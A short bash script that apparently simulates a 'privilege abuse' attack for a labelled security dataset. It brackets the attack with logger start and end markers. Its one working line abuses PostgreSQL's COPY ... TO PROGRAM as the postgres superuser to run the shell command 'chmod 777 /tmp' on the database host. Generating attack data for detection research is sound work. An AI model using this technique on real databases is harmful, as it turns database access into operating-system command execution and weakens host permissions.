#!/bin/bash
echo "Simulating Privilege Abuse Attack (chmod_tmp)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_chmod_tmp" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'chmod 777 /tmp > /tmp/out_chmod_tmp.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_chmod_tmp" end
